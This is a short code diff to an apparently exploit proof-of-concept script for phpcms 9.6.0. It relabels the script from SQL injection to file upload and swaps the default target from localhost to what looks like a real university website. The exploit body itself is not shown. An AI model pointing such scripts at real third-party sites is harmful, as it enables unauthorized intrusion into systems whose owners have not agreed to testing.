@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # coding: utf-8
 #Authon:phyb0x
-#phpcms9.6.0 sqli
+#phpcms9.6.0 upload
 
 import requests
 import urllib
@@ -38,4 +38,4 @@ def poc(url):
 		print(result)
 
 if __name__ == '__main__':
-	poc('http://localhost/phpcms9.6.0/')
+	poc('http://foreign.ynufe.edu.cn')
